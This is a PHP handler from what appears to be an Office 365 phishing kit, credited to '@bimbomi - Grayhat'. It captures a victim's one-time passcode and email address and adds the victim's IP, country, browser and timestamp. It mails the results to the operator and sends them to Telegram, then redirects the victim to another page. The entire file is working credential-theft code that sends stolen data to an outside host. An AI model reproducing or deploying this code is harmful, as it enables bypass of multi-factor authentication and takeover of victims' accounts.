<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/geo.php';
include_once __DIR__ . '/me.php';

$otp   = trim($_POST['otp'] ?? '');
$email = $_COOKIE['email'] ?? 'unknown';
$ip    = visitor_ip();

$message  = "⭐️O365 RESULTS⭐️\n\n";
$message .= "|--------------[OTP☎️]----------------|\n\n";
$message .= "Email: {$email}\n";
$message .= "OTP: {$otp}\n\n";
$message .= "|--------------[IP INFO📍]----------------|\n\n";
$message .= "User-IP: {$ip}\n";
$message .= "Country: " . visitor_country($ip) . "\n";
$message .= "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? '-') . "\n";
$message .= "Date: " . date('D M d, Y g:i a') . "\n\n";
$message .= "| Author✍️: @bimbomi - Grayhat |\n";

@mail($send, '**NEW OFFICE365 RESULTS**', $message, "From: Grayhat");
send_telegram_msg($message);

header('Location: c.html');
exit;